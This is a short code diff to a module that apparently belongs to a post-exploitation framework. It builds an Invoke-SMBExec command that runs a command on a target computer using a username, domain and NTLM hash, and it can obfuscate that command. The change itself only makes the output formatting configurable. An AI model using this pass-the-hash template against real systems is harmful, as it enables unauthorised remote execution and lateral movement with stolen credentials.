@@ -70,8 +70,8 @@ class Module(object):
             print(helpers.color("[*] Running command:  " + Cmd))
 
         script_end = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computer_name, user_name, domain, ntlm_hash, Cmd)
-        script_end += "| Out-String | %{$_ + \"`n\"};"
-
+        outputf = params.get("OutputFunction", "Out-String")
+        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
 
         if obfuscate:
             script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
